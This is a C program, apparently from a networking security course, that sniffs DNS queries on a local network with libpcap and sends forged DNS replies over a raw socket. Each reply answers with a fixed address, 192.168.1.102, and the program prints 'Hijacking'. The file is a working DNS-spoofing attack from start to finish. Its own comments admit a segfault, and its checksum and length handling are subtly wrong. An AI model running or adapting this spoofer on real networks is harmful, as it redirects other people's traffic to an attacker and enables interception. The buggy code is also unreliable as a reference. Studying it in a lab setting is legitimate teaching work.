/*
 * pcap_example.c
 *
 *  Created on: Apr 28, 2016
 *      Author: jiaziyi
 */



#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <unistd.h>
#include<pcap.h>

#include "header.h"



#include "dns_hijack.h"
#include "header.h"
#include "dns.h"

//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;


int main(int argc, char *argv[])
{
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;


	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode");
	}

	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	//BEGIN_SOLUTION
	//	char filter_exp[] = "host 192.168.1.100";	/* The filter expression */
	char filter_exp[] = "udp && (dst port 53)";
	//	char filter_exp[] = "udp && port 53";
	struct bpf_program fp;		/* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	//END_SOLUTION

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}

	//Put the device in sniff loop
	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);

	return 0;

}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	printf("a packet is received! %d \n", total++);
	int size = header->len;

	//	print_udp_packet(buffer, size);

//	PrintData(buffer, size);

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	switch (header_type)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr*)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr*)(buffer + 57);
		size -= 57;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}

	print_udp_packet((u_char*)in_iphr, size);


	//to keep the DNS information received.
	res_record answers[ANS_SIZE], auth[ANS_SIZE], addit[ANS_SIZE];
	query queries[ANS_SIZE];
	bzero(queries, ANS_SIZE*sizeof(query));
	bzero(answers, ANS_SIZE*sizeof(res_record));
	bzero(auth, ANS_SIZE*sizeof(res_record));
	bzero(addit, ANS_SIZE*sizeof(res_record));

	//! Why is +1 

	//the UDP header
	struct udphdr *in_udphdr = (struct udpdr*)(in_iphr + 1);

	//the DNS header
	//	dns_header *dnsh = (dns_header*)(udph + 1);
	uint8_t *dns_buff = (uint8_t*)(in_udphdr + 1);

	//! Why is +1 
	
	//	parse the dns query
	int id = parse_dns_query(dns_buff, queries, answers, auth, addit);

	dns_header * dns_recv = (dns_header *) dns_buff;

	/******************now build the reply using raw IP ************/


	/*****************buitld the sending message********/
	uint8_t send_buf[BUF_SIZE]; //sending buffer
	uint8_t *dns_msg = send_buf+sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(struct dns_header);
	uint8_t *pointer_msg=dns_msg;
	bzero(send_buf, BUF_SIZE);
	int qd_count=ntohs(dns_recv->qd_count);
	for(int i=0;i<qd_count;i++){
		get_dns_name(pointer_msg,queries[i].qname);
		pointer_msg+=strlen(pointer_msg)+1;
		question *q_queris= (question *)pointer_msg;
		q_queris->qclass=queries[i].ques->qclass;
		q_queris->qtype=queries[i].ques->qtype;
		pointer_msg+=sizeof(question);
	}
	//there are seg fault here.
	for(int i=0;i<qd_count;i++){
		printf("%d\n",i);
		res_record r;
		r.name = pointer_msg;
		get_dns_name(r.name,queries[i].qname);
		pointer_msg+=strlen(r.name)+1;
		r.element= pointer_msg;
		r.element ->type = htons(TYPE_A); //ipv4
		r.element ->rdlength =htons(4);
		r.element ->ttl = htonl(500);
		r.element ->_class=htons(CLASS_IN); // class internet
		pointer_msg+=sizeof(r_element);  
		r.rdata=pointer_msg;
		*(r.rdata)=192; 
		*(r.rdata+1)=168; 
		*(r.rdata+2)=1; 
		*(r.rdata+3)=102; 
		pointer_msg +=4;
	}



	/**********dns header*************/
	dns_header *dnshdr = (dns_header*)(send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));
	int dns_size = 0;
    //TODO
	memcpy(dnshdr, dns_recv, sizeof(dns_header));
	dnshdr->qr=1;
	dnshdr->an_count=dns_recv->qd_count;




	/****************UDP header********************/
	struct udphdr *out_udphdr = (struct udphdr*)(send_buf + sizeof(struct iphdr));
    out_udphdr ->source = in_udphdr ->dest;
	out_udphdr->dest=in_udphdr->source;
	out_udphdr->len=htons(pointer_msg- (uint8_t *) out_udphdr);
	out_udphdr->check=0;
    // puts("UDP header good");

	/*****************IP header************************/
	struct iphdr *out_iphdr = (struct iphdr*)send_buf;

    out_iphdr->version=4;
	out_iphdr->ihl=5;// there 5*4 byte
	out_iphdr->tos= 0; 
	out_iphdr->tot_len=pointer_msg- (uint8_t *)out_iphdr;
	// printf("tot_len = %d\n",out_iphdr->tot_len);   
	out_iphdr->id=0;
	out_iphdr->frag_off=0;
	out_iphdr->ttl=255;
	out_iphdr->protocol=IPPROTO_UDP; //
	out_iphdr->check=0;
	// puts("joiadsfjioasdjiofjsd");
	out_iphdr->saddr=in_iphr->daddr;
	out_iphdr->daddr=in_iphr->saddr;
	// puts("jadosifjoisdjfrqewiorjioewjrowe");
	unsigned short check = checksum((unsigned short *)out_iphdr, 20);
	out_iphdr->check=check;
	out_iphdr->check=0;
	printf("ip checksum  = %hx\n, %ho\n",check,check);	
	
	printf("size of check %d\n",sizeof(check));

	// puts("IP header good");
	/************** send out using raw IP socket************/

	
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	
    int hincl =1 ;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0){
		perror("Error creating raw socket ");
		exit(1);
	}

	printf("fd = %d\n",fd);


		//Send the packet

    struct sockaddr_in *to=malloc(sizeof(struct sockaddr_in));
    memset(to,0,sizeof(struct sockaddr_in));
    to->sin_family=AF_INET;
    to->sin_port=out_udphdr->dest;
	to->sin_addr.s_addr=out_iphdr->daddr;
   
    int nb_byte_sent = sendto(fd,send_buf,
								out_iphdr->tot_len,
								0,
								(const struct sockaddr *)to,
								sizeof(struct sockaddr_in));

    if(nb_byte_sent<0){
		fprintf(stderr,"fail send  %d\n",nb_byte_sent);
	}
	printf("sended\n");
	puts("Hijacking");
	close(fd);
}



